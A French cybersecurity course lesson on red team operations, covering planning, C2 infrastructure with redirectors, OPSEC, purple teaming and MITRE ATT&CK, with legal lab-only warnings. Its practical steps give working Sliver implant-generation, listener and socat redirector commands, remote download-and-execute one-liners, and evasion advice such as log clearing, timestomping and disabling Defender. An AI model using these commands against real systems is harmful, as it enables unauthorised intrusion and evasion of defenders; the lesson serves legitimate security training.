---
tags:
  - Cybersécurité
  - Avancé
  - Concept
description: "Red Team Operations : planification, infrastructure C2, OPSEC, purple teaming et MITRE ATT&CK"
estimated_time: "55 min"
fiche_number: 1
total_fiches: 4
cursus: "Phase 7 - Red Team Avancé"
id: "security.cybersecurity.red-team.red-team-operations"
course_id: "security.cybersecurity"
module_id: "security.cybersecurity.red-team"
content_type: "lesson"
order: 1
---

# 01 - Red Team Operations

> **En bref** : À la fin de cette fiche, tu sauras planifier une opération red team complète, déployer une infrastructure C2 avec redirecteurs, appliquer les principes d'OPSEC pour éviter la détection, structurer tes opérations avec le framework MITRE ATT&CK, et collaborer avec la blue team dans un exercice purple team. Lecture estimée : 55 min.

!!! warning "Cadre légal : lab et autorisation uniquement"
    Planifier un C2, des redirecteurs ou une opération red team se fait **uniquement** dans un lab isolé ou un engagement contractuel avec règles d'engagement (RoE) écrites. Hors de ce cadre, l'usage d'outils offensifs contre des systèmes tiers est illégal en France (Code pénal, art. 323-1 et s.). Ce wiki n'est **pas** une autorisation d'attaque.

## Prérequis

- [Phase 4 - Spécialisation Offensive](../04-specialisation-offensive/index.md) (complète), en particulier :
  - [Méthodologie de Pentest](../04-specialisation-offensive/01-methodologie-pentest.md)
  - [Exploitation et Post-Exploitation](../04-specialisation-offensive/02-exploitation-post-exploitation.md)
  - [Active Directory - Attaque et Sécurisation](../04-specialisation-offensive/03-active-directory.md)
- Connaissances solides en réseaux (TCP/IP, DNS, HTTP/HTTPS, proxies)
- Expérience pratique avec Metasploit et les techniques de post-exploitation

## Objectif de cette fiche

À la fin de cette fiche, tu sauras planifier une opération red team complète, déployer une infrastructure C2 avec redirecteurs, appliquer les principes d'OPSEC pour éviter la détection, structurer tes opérations avec le framework MITRE ATT&CK, et collaborer avec la blue team dans un exercice purple team.

---

## Concepts

Cette section explique tous les concepts nécessaires. Lis-la entièrement avant de passer aux étapes pratiques.

### Qu'est-ce qu'une opération Red Team ?

**Définition** : Une opération red team est une simulation d'attaque réaliste menée par des professionnels de la sécurité offensive pour tester la capacité de détection et de réponse d'une organisation face à un adversaire déterminé. Contrairement à un pentest classique, l'objectif n'est pas de trouver un maximum de vulnérabilités, mais de simuler un scénario d'attaque réaliste de bout en bout.

**Le problème que les opérations red team résolvent** :

Sans opérations red team, voici les problèmes rencontrés :

1. **Tests de sécurité irréalistes** : un pentest classique se concentre sur les vulnérabilités techniques. Il ne teste pas la capacité de détection de l'équipe SOC (Security Operations Center)
2. **Fausse confiance** : une organisation peut avoir des outils de sécurité déployés mais ne jamais vérifier s'ils détectent réellement les attaques modernes
3. **Manque de contexte opérationnel** : les tests classiques ne simulent pas les tactiques, techniques et procédures (TTPs) des groupes d'attaquants réels

**Comment les opérations red team résolvent ces problèmes** :

| Problème | Solution apportée par le red team |
| -------- | --------------------------------- |
| Tests irréalistes | Simulation complète d'un adversaire réel avec objectifs métier (vol de données, ransomware) |
| Fausse confiance | Test réel de la chaîne de détection : EDR, SIEM, SOC, processus de réponse |
| Manque de contexte | Émulation d'un groupe APT spécifique avec ses TTPs documentées |

**Analogie concrète** : Un pentest est comme un exercice d'alarme incendie annoncé à l'avance : tout le monde sait qu'il a lieu. Une opération red team est comme un exercice surprise où des acteurs jouent le rôle de vrais intrus pour tester si les gardiens les détectent, si les caméras fonctionnent, et si la procédure d'alerte est suivie.

**Ce qu'une opération red team n'est PAS** :

- Une opération red team n'est pas un pentest. Un pentest cherche à identifier le maximum de vulnérabilités dans un périmètre défini. Le red team simule un adversaire réel avec un objectif précis (exfiltrer des données, accéder au contrôleur de domaine).
- Une opération red team n'est pas une attaque réelle. Elle est encadrée par des règles d'engagement (RoE), un cadre légal et une cellule blanche qui supervise.

**Comparaison pentest vs red team** :

| Pentest | Red Team |
| ------- | -------- |
| Périmètre défini et limité | Périmètre large, réaliste |
| Durée courte (1-3 semaines) | Durée longue (1-6 mois) |
| Objectif : trouver des vulnérabilités | Objectif : tester la détection et la réponse |
| Blue team informée | Blue team non informée (sauf cellule blanche) |
| Rapport de vulnérabilités | Rapport de scénario d'attaque complet |
| Techniques bruyantes acceptées | Furtivité obligatoire |

---

### Qu'est-ce que le Threat Modeling Adversaire ?

**Définition** : Le threat modeling adversaire (modélisation de la menace) consiste à identifier quel type d'attaquant cible l'organisation, quelles sont ses capacités, ses motivations et ses méthodes. Cette analyse détermine le scénario de l'opération red team.

**Le problème que le threat modeling résout** :

Sans threat modeling, voici les problèmes rencontrés :

1. **Scénario irréaliste** : simuler un attaquant nation-état contre une PME n'a pas de sens
2. **Mauvaise priorisation** : tester des attaques que l'adversaire réel n'utiliserait jamais
3. **Résultats non exploitables** : les recommandations ne correspondent pas aux menaces réelles

**Comment le threat modeling résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Scénario irréaliste | L'APT mapping identifie les groupes qui ciblent le secteur de l'organisation |
| Mauvaise priorisation | Les TTPs de l'adversaire émulé guident les techniques utilisées |
| Résultats non exploitables | Les recommandations sont directement liées aux menaces identifiées |

**APT Mapping** :

L'APT (Advanced Persistent Threat) mapping consiste à identifier les groupes d'attaquants connus qui ciblent le secteur d'activité de l'organisation :

| Secteur | Groupes APT connus | Motivations |
| ------- | ------------------- | ----------- |
| Finance | APT38 (Lazarus), FIN7, Carbanak | Vol financier, fraude |
| Santé | APT41, APT10 | Vol de données médicales, propriété intellectuelle |
| Énergie | Sandworm, Dragonfly | Sabotage, espionnage étatique |
| Défense | APT28 (Fancy Bear), APT29 (Cozy Bear) | Espionnage militaire |
| Technologie | APT41, Hafnium | Vol de propriété intellectuelle |

**Analogie concrète** : Avant de tester la sécurité d'une banque, tu étudies les braquages qui ont eu lieu dans des banques similaires. Quelles méthodes les braqueurs ont-ils utilisées ? Par où sont-ils entrés ? Combien de temps ont-ils mis ? Cette analyse permet de simuler un scénario réaliste.

---

### Qu'est-ce que la planification d'une opération ?

**Définition** : La planification est la phase qui précède toute action technique. Elle définit les objectifs, le périmètre, les règles d'engagement, le timing et la déconfliction avec la blue team.

**Éléments clés de la planification** :

1. **Objectifs** : ce que l'opération doit démontrer (accéder au contrôleur de domaine, exfiltrer 10 Go de données, déployer un ransomware simulé)
2. **Règles d'engagement (RoE)** : ce qui est autorisé et interdit (pas de déni de service, pas d'accès aux systèmes de production critiques)
3. **Timing** : durée de l'opération, fenêtres d'attaque autorisées, jalons
4. **Déconfliction** : coordination avec une cellule blanche (personnes informées côté défense) pour éviter les incidents réels
5. **Communication d'urgence** : canal de communication en cas de problème (si l'attaque provoque un incident réel non prévu)

**La cellule blanche** :

La cellule blanche est un petit groupe de personnes informées de l'opération :

- Le CISO (Chief Information Security Officer)
- Un responsable juridique
- Un contact technique d'urgence

Ces personnes ne participent pas à la défense. Elles supervisent l'opération et interviennent uniquement en cas de problème.

---

### Qu'est-ce qu'une infrastructure C2 ?

**Définition** : L'infrastructure C2 (Command and Control) est l'ensemble des serveurs, redirecteurs et canaux de communication qu'un attaquant utilise pour contrôler les machines compromises et exfiltrer des données.

**Le problème que l'infrastructure C2 résout** :

Sans infrastructure C2, voici les problèmes rencontrés :

1. **Pas de contrôle persistant** : sans C2, l'attaquant perd le contrôle de la machine dès que la session est fermée
2. **Communication directe détectable** : une connexion directe entre la machine victime et le serveur de l'attaquant est facilement repérée par les firewalls
3. **Pas de résilience** : si le serveur de l'attaquant est bloqué, toute l'opération est perdue

**Comment l'infrastructure C2 résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Pas de contrôle persistant | Les implants (agents) maintiennent une connexion régulière avec le C2 |
| Communication directe détectable | Les redirecteurs masquent l'adresse du serveur C2 réel |
| Pas de résilience | Plusieurs canaux C2 (HTTP, DNS, SMB) garantissent la continuité |

**Frameworks C2 principaux** :

| Framework | Langage | Points forts | Licence |
| --------- | ------- | ------------ | ------- |
| Cobalt Strike | Java | Standard de l'industrie, malleable C2 profiles, beacon très stable | Commercial (~5000 USD/an) |
| Mythic | Go/Python | Open source, modulaire, interface web moderne, multi-agent | Open source |
| Sliver | Go | Open source, implants en Go, multi-plateforme, facile à déployer | Open source |
| Havoc | C/C++ | Open source, performant, BOF (Beacon Object Files) support | Open source |

**Architecture C2 avec redirecteurs** :

```text
[Machine victime]
       |
       | HTTPS (port 443)
       v
[Redirecteur 1]  ------>  [Serveur C2]
(VPS jetable)              (protégé, accès restreint)
       |
[Redirecteur 2]  ------>  [Serveur C2]
(CDN / Domain fronting)
```

Le redirecteur est un serveur intermédiaire qui reçoit le trafic de la victime et le transmet au serveur C2 réel. Si le redirecteur est identifié et bloqué, l'attaquant en déploie un nouveau sans exposer le C2.

**Domain fronting** :

Le domain fronting utilisait un CDN pour masquer la destination réelle du trafic : le SNI HTTPS affichait un domaine légitime (par exemple un hôte Microsoft ou AWS) alors que le header HTTP `Host` pointait vers le domaine C2. **Ce n'est plus une technique fiable** : AWS CloudFront, Google et Cloudflare ont bloqué le domain fronting (2018-2021). Ne le présente pas comme un canal C2 actuel. Les exercices de cette fiche s'appuient sur un redirecteur `socat`, pas sur du domain fronting.

**Malleable C2 profiles** (Cobalt Strike) :

Les profiles malléables permettent de personnaliser l'apparence du trafic C2 pour qu'il ressemble à du trafic légitime :

- Le trafic peut imiter des requêtes vers Google Analytics, Microsoft 365 ou Amazon
- Les headers HTTP, les URI, les cookies et le corps des requêtes sont personnalisables
- Le timing des callbacks (check-in de l'agent) est configurable avec du jitter (variation aléatoire)

**Analogie concrète** : L'infrastructure C2 est comme un réseau de boîtes aux lettres secrètes utilisé par un espion. L'espion (l'implant) dépose ses messages dans une boîte aux lettres publique (le redirecteur). Un coursier récupère le message et le transmet au quartier général (le serveur C2). Si une boîte aux lettres est surveillée, l'espion utilise une autre boîte.

**Ce qu'une infrastructure C2 n'est PAS** :

- L'infrastructure C2 n'est pas un simple reverse shell. Un reverse shell est une connexion directe et temporaire. Le C2 fournit persistance, chiffrement, et gestion de multiples agents.
- L'infrastructure C2 n'est pas un VPN. Un VPN crée un tunnel réseau. Le C2 transporte des commandes et des résultats, souvent en imitant du trafic web légitime.

---

### Qu'est-ce que l'OPSEC ?

**Définition** : L'OPSEC (Operations Security) est l'ensemble des pratiques qui permettent à l'attaquant de mener ses opérations sans être détecté. L'objectif est de minimiser les traces laissées sur les systèmes compromis et dans le réseau.

**Le problème que l'OPSEC résout** :

Sans OPSEC, voici les problèmes rencontrés :

1. **Détection rapide** : les outils de sécurité (EDR, SIEM) génèrent des alertes sur les actions suspectes
2. **Attribution** : les traces laissées permettent de remonter jusqu'à l'infrastructure de l'attaquant
3. **Perte d'accès** : une fois détecté, l'attaquant est éjecté du réseau et doit tout recommencer

**Comment l'OPSEC résout ces problèmes** :

| Problème | Solution OPSEC |
| -------- | -------------- |
| Détection rapide | Anti-forensics : timestomping, suppression de logs, nettoyage de traces |
| Attribution | Utilisation de redirecteurs, VPN chaînés, infrastructure jetable |
| Perte d'accès | Canaux C2 multiples, persistance redondante, communications chiffrées |

**Techniques OPSEC essentielles** :

**Timestomping** :

Le timestomping modifie les horodatages des fichiers (création, modification, accès) pour qu'ils correspondent à des fichiers légitimes. Un fichier déposé par l'attaquant avec un timestamp de 2 minutes ne passera pas inaperçu dans un dossier où tous les fichiers datent de 6 mois.

**Log evasion** :

- Désactiver ou modifier les logs Windows (Event Log, Sysmon)
- Nettoyer les entrées de log après les actions
- Utiliser des techniques qui ne génèrent pas de logs (In-memory exécution)
- Éviter PowerShell en mode "ConstrainedLanguage" qui enregistre tout

**Covert channels** :

Les canaux cachés utilisent des protocoles légitimes pour transporter des données C2 :

| Canal | Description | Avantage |
| ----- | ----------- | -------- |
| DNS | Données encodées dans les requêtes DNS | Le DNS est rarement filtré |
| HTTPS | Trafic C2 dans des connexions HTTPS normales | Chiffré, difficile à inspecter |
| ICMP | Données dans les paquets ping | Souvent autorisé par les firewalls |
| SMB | Communications via partages réseau Windows | Trafic interne légitime |

**Analogie concrète** : L'OPSEC est comme les précautions d'un cambrioleur professionnel. Il porte des gants (pas de traces digitales = pas de logs), il change de véhicule (infrastructure jetable), il surveille les caméras (détection des outils de sécurité), et il passe par des rues peu fréquentées (canaux cachés).

---

### Qu'est-ce que le Purple Teaming ?

**Définition** : Le purple teaming est une approche collaborative où le red team (attaque) et le blue team (défense) travaillent ensemble pour améliorer la posture de sécurité. Les deux équipes partagent leurs TTPs et leurs détections en temps réel.

**Le problème que le purple teaming résout** :

Sans purple teaming, voici les problèmes rencontrés :

1. **Opérations en silo** : le red team trouve des failles mais la blue team ne sait pas comment les détecter
2. **Pas d'amélioration continue** : les résultats du red team sont un rapport statique, pas un processus itératif
3. **Temps perdu** : le red team passe du temps à contourner des défenses au lieu de tester des scénarios avancés

**Comment le purple teaming résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Opérations en silo | Sessions de travail communes où le red team exécute et la blue team observe |
| Pas d'amélioration continue | Cycle itératif : attaque -> détection -> amélioration -> rétest |
| Temps perdu | Focus sur les TTPs les plus pertinentes au lieu de tout tester |

**Déroulement d'un exercice purple team** :

1. **Sélection des TTPs** : choisir les techniques à tester (par exemple : T1053.005 - Scheduled Task)
2. **Exécution par le red team** : l'attaquant exécute la technique dans un environnement contrôlé
3. **Observation par la blue team** : les défenseurs vérifient si la technique est détectée par les outils (EDR, SIEM)
4. **Analyse des gaps** : si la technique n'est pas détectée, identifier pourquoi
5. **Amélioration** : créer ou ajuster les règles de détection
6. **Rétest** : le red team rejoue la technique pour valider la détection

---

### Qu'est-ce que le framework MITRE ATT&CK ?

**Définition** : MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) est une base de connaissances publique qui documente les tactiques et techniques utilisées par les attaquants. Elle sert de langage commun entre les équipes offensives et défensives.

**Le problème que MITRE ATT&CK résout** :

Sans MITRE ATT&CK, voici les problèmes rencontrés :

1. **Pas de vocabulaire commun** : le red team et la blue team décrivent les mêmes techniques avec des termes différents
2. **Couverture incomplète** : impossible de savoir quelles techniques sont détectées et lesquelles ne le sont pas
3. **Pas de référence structurée** : chaque organisation invente sa propre classification des attaques

**Comment MITRE ATT&CK résout ces problèmes** :

| Problème | Solution |
| -------- | -------- |
| Pas de vocabulaire commun | Chaque technique a un identifiant unique (ex : T1059.001 = PowerShell) |
| Couverture incomplète | La matrice ATT&CK montre visuellement les gaps de détection |
| Pas de référence structurée | 14 tactiques, plus de 200 techniques documentées avec des exemples réels |

**Les 14 tactiques (colonnes de la matrice)** :

| Tactique | Description | Exemple |
| -------- | ----------- | ------- |
| Reconnaissance | Collecte d'informations sur la cible | Scan de ports, OSINT |
| Resource Development | Préparation de l'infrastructure | Achat de domaines, configuration C2 |
| Initial Access | Première intrusion | Phishing, exploit web |
| Exécution | Exécution de code | PowerShell, scripts |
| Persistence | Maintien de l'accès | Tâches planifiées, clés de registre |
| Privilege Escalation | Élévation de droits | Exploit noyau, token manipulation |
| Defense Evasion | Évasion des défenses | Obfuscation, AMSI bypass |
| Credential Access | Vol d'identifiants | Mimikatz, Kerberoasting |
| Discovery | Reconnaissance interne | Énumération AD, scan réseau |
| Lateral Movement | Déplacement latéral | PsExec, WMI, RDP |
| Collection | Collecte de données | Keylogging, capture d'écran |
| Command and Control | Communication C2 | HTTPS beacon, DNS tunneling |
| Exfiltration | Extraction de données | Exfiltration via C2, cloud storage |
| Impact | Impact sur la cible | Chiffrement (ransomware), destruction |

---

## Étapes Pratiques

> **Cadre strict** : installer un C2 (Sliver, etc.) et simuler une opération red team se fait uniquement dans un lab isolé ou dans le cadre d'un engagement contractuel avec règles d'engagement (RoE) écrites. Hors de ce cadre, l'usage d'un C2 contre des systèmes tiers est en principe illégal (accès non autorisé et outils d'attaque selon la juridiction).

### Étape 1 : Installer Sliver C2

Sliver est un framework C2 open source écrit en Go. Il est plus simple à déployer que Cobalt Strike et ne nécessite pas de licence.

```bash
# Télécharger et installer Sliver sur un serveur Linux (Debian/Ubuntu)
curl https://sliver.sh/install | sudo bash

# Vérifier que Sliver est installé
sliver-server version
```

**Résultat attendu** :

```text
Sliver v1.5.x - https://github.com/BishopFox/sliver
Compiled at: 2024-xx-xx
```

---

### Étape 2 : Démarrer le serveur Sliver et générer un implant

```bash
# Démarrer le serveur Sliver
sliver-server

# Dans la console Sliver, générer un implant HTTPS
# Le flag --http indique le protocole de communication
# Le flag --os indique le système cible
generate --http 192.168.1.100 --os windows --arch amd64 --save /tmp/implant.exe
```

**Résultat attendu** :

```text
[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 32s
[*] Implant saved to /tmp/implant.exe
```

---

### Étape 3 : Configurer un listener HTTPS

```bash
# Dans la console Sliver, démarrer un listener HTTPS
https --lhost 0.0.0.0 --lport 443

# Vérifier que le listener est actif
jobs
```

**Résultat attendu** :

```text
[*] Starting HTTPS listener ...
[*] Successfully started job #1

 ID   Name    Protocol   Port
 ==   ====    ========   ====
 1    https   tcp        443
```

---

### Étape 4 : Configurer un redirecteur avec socat

Le redirecteur transmet le trafic de la victime vers le serveur C2 sans exposer l'adresse du C2.

```bash
# Sur le serveur redirecteur (VPS jetable)
# Installer socat
sudo apt install socat -y

# Rediriger le port 443 du redirecteur vers le C2
# Remplace C2_SERVER_IP par l'adresse IP de ton serveur Sliver
socat TCP-LISTEN:443,fork,reuseaddr TCP:C2_SERVER_IP:443
```

**Résultat attendu** :

```text
# socat ne produit pas de sortie visible
# Le trafic arrivant sur le port 443 du redirecteur est transmis au C2
```

---

### Étape 5 : Mapper une opération avec MITRE ATT&CK Navigator

Le ATT&CK Navigator permet de visualiser les techniques utilisées pendant une opération.

```bash
# Cloner le projet ATT&CK Navigator pour un usage local (offline)
git clone https://github.com/mitre-attack/attack-navigator.git
cd attack-navigator/nav-app

# Installer les dépendances et lancer l'application
npm install
npm start
```

**Résultat attendu** :

```text
** Angular Live Development Server is listening on localhost:4200 **
```

Ouvre `http://localhost:4200` dans un navigateur. Crée une nouvelle couche (layer) et sélectionne les techniques prévues pour ton opération. Exporte la couche en JSON pour la documenter dans le rapport.

---

### Étape 6 : Simuler un exercice purple team avec Atomic Red Team

Atomic Red Team fournit des tests unitaires pour chaque technique MITRE ATT&CK.

```powershell
# Installer Atomic Red Team (PowerShell, sur la machine Windows de test)
# Ouvrir PowerShell en tant qu'administrateur
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
```

Pour exécuter un test spécifique (par exemple T1053.005 - Scheduled Task/Job) :

```powershell
# Exécuter le test atomique pour la technique T1053.005
Invoke-AtomicTest T1053.005
```

**Résultat attendu** :

```text
PathName : T1053.005-1 Scheduled Task Startup Script
Technique : Scheduled Task/Job: Scheduled Task
TestName : Scheduled Task Startup Script
[*] Executing test: T1053.005-1 Scheduled Task Startup Script
[*] Done executing test: T1053.005-1
```

Après l'exécution, vérifie dans le SIEM ou l'EDR si l'action a été détectée.

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `sliver-server` | Démarrer le serveur Sliver C2 |
| `generate --http IP --os windows` | Générer un implant HTTPS pour Windows |
| `https --lhost 0.0.0.0 --lport 443` | Démarrer un listener HTTPS dans Sliver |
| `sessions` | Lister les sessions actives dans Sliver |
| `use SESSION_ID` | Interagir avec une session spécifique |
| `info` | Afficher les informations de la session courante |
| `socat TCP-LISTEN:443,fork TCP:IP:443` | Créer un redirecteur TCP simple |
| `Invoke-AtomicTest TXXXX` | Exécuter un test Atomic Red Team |
| `timestomp FILE --match REFERENCE` | Modifier les timestamps d'un fichier (Sliver) |

---

## Pièges Fréquents

### Piège 1 : Exposer le serveur C2 directement

⚠️ **Problème** : Configurer l'implant pour qu'il se connecte directement au serveur C2, sans redirecteur. Si la blue team identifie l'adresse IP, le serveur C2 est grillé et toute l'infrastructure est compromise.

✅ **Solution** : Toujours utiliser au moins un redirecteur entre la victime et le C2. Utilise des VPS jetables comme redirecteurs. En cas de détection, remplace le redirecteur et mets à jour l'implant.

---

### Piège 2 : Oublier la déconfliction avec la blue team

⚠️ **Problème** : Lancer une opération red team sans informer une cellule blanche. La blue team déclenche un incident de sécurité majeur, appelle les autorités, et l'opération tourne au chaos.

✅ **Solution** : Toujours définir une cellule blanche avec un canal de communication d'urgence (numéro de téléphone, signal). Avoir un mot de code pour stopper immédiatement l'opération si nécessaire.

---

### Piège 3 : Ne pas documenter les actions

⚠️ **Problème** : Pendant l'opération, l'attaquant oublie de noter les commandes exécutées, les timestamps et les résultats. Le rapport final est incomplet et inutile.

✅ **Solution** : Utiliser un outil de logging automatique (Sliver enregistre tout dans sa base de données). En complément, tenir un journal d'opérations avec : timestamp, technique MITRE ATT&CK, commande exécutée, résultat, détection observée.

---

### Piège 4 : Utiliser des outils connus sans les personnaliser

⚠️ **Problème** : Utiliser Mimikatz, Cobalt Strike ou PowerShell Empire avec les configurations par défaut. Les signatures sont connues de tous les EDR et l'alerte est immédiate.

✅ **Solution** : Personnaliser les malleable profiles (Cobalt Strike), modifier les implants Sliver avec des options d'obfuscation, et développer ses propres outils quand c'est possible. La fiche suivante (02 - Évasion) approfondit ce sujet.

---

### Piège 5 : Confondre OPSEC technique et OPSEC humaine

⚠️ **Problème** : Avoir une infrastructure C2 parfaitement camouflée, mais poster sur les réseaux sociaux qu'on est en train de tester un client, ou utiliser son adresse email personnelle pour enregistrer les domaines C2.

✅ **Solution** : L'OPSEC s'applique aussi aux personnes. Utiliser des identités fictives pour les enregistrements de domaines. Ne jamais discuter d'une opération en cours sur des canaux non sécurisés. Séparer strictement la vie professionnelle red team de la vie personnelle en ligne.

---

## Checklist de Validation

- [ ] Je sais expliquer la différence entre un pentest et une opération red team
- [ ] Je connais les éléments d'une planification d'opération (objectifs, RoE, timing, déconfliction)
- [ ] Je sais ce qu'est l'APT mapping et pourquoi il détermine le scénario d'attaque
- [ ] Je peux nommer 4 frameworks C2 et expliquer leur rôle
- [ ] Je comprends l'architecture C2 avec redirecteurs et le concept de domain fronting
- [ ] Je connais les techniques OPSEC : timestomping, log evasion, covert channels
- [ ] Je sais ce qu'est le purple teaming et son déroulement
- [ ] Je peux naviguer dans la matrice MITRE ATT&CK et identifier les 14 tactiques
- [ ] J'ai déployé Sliver C2 et généré un implant
- [ ] J'ai configuré un redirecteur avec socat

---

## Exercice Pratique

**Énoncé** : Planifie et déploie une infrastructure C2 complète pour une opération red team simulée.

**Indications** :

- Installe Sliver sur une VM Linux (serveur C2)
- Configure un redirecteur sur une deuxième VM (socat ou iptables)
- Génère un implant HTTPS qui se connecte au redirecteur (pas directement au C2)
- Exécute l'implant sur une VM Windows de test
- Vérifie que la session apparaît dans Sliver
- Documente l'opération en utilisant les identifiants MITRE ATT&CK (T1071.001 pour HTTPS C2, T1090.002 pour le redirecteur)
- Crée un fichier texte `operation-log.txt` avec : timestamp, technique ATT&CK, commande, résultat

**Résultat attendu** : Une session Sliver active via le redirecteur, avec un journal d'opérations documenté.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

**Étape 1 : Préparer l'environnement**

Trois VMs sont nécessaires :

| VM | Rôle | IP (exemple) |
| -- | ---- | ------------ |
| VM1 - Kali/Debian | Serveur C2 Sliver | 10.0.0.10 |
| VM2 - Debian minimal | Redirecteur | 10.0.0.20 |
| VM3 - Windows 10/11 | Cible (victime simulée) | 10.0.0.30 |

**Étape 2 : Installer et configurer Sliver (VM1)**

```bash
# Installer Sliver
curl https://sliver.sh/install | sudo bash

# Démarrer le serveur
sliver-server

# Démarrer le listener HTTPS
https --lhost 0.0.0.0 --lport 443

# Générer l'implant qui pointe vers le redirecteur (VM2), pas le C2
generate --http 10.0.0.20 --os windows --arch amd64 --save /tmp/implant.exe
```

**Étape 3 : Configurer le redirecteur (VM2)**

```bash
# Installer socat sur le redirecteur
sudo apt update && sudo apt install socat -y

# Rediriger le trafic HTTPS vers le C2
socat TCP-LISTEN:443,fork,reuseaddr TCP:10.0.0.10:443
```

**Étape 4 : Exécuter l'implant (VM3)**

Transfère `implant.exe` vers la VM Windows et exécute-le. Désactive Windows Defender pour ce test initial (la fiche 02 couvre l'évasion).

**Étape 5 : Vérifier la session (VM1)**

```bash
# Dans la console Sliver, lister les sessions
sessions

# Interagir avec la session
use SESSION_ID

# Vérifier les informations de la machine compromise
info
whoami
```

**Étape 6 : Documenter l'opération**

```bash
# Créer le journal d'opérations
cat << 'EOF' > operation-log.txt
=== JOURNAL D'OPÉRATIONS RED TEAM ===
Date : 2025-XX-XX
Opérateur : [Ton nom]

--- PHASE 1 : INFRASTRUCTURE ---
[10:00] T1583.004 - Acquire Infrastructure: Server
  Action : Déploiement serveur C2 Sliver sur 10.0.0.10
  Résultat : Serveur opérationnel, listener HTTPS actif

[10:15] T1090.002 - Proxy: External Proxy
  Action : Configuration redirecteur socat sur 10.0.0.20
  Résultat : Redirecteur opérationnel, trafic transmis au C2

--- PHASE 2 : ACCÈS INITIAL ---
[10:30] T1204.002 - User Execution: Malicious File
  Action : Exécution de l'implant sur la machine cible 10.0.0.30
  Résultat : Session active dans Sliver

[10:31] T1071.001 - Application Layer Protocol: Web Protocols
  Action : Communication C2 via HTTPS
  Résultat : Callbacks réguliers toutes les 60 secondes

--- DÉTECTION ---
  EDR : [Oui/Non - noter si une alerte a été générée]
  SIEM : [Oui/Non - noter les logs observés]
  Firewall : [Oui/Non - trafic bloqué ou autorisé]
EOF
```

---

## Navigation

→ Fiche suivante : **[02 - Évasion et Développement d'outils offensifs](02-evasion-outils-offensifs.md)**
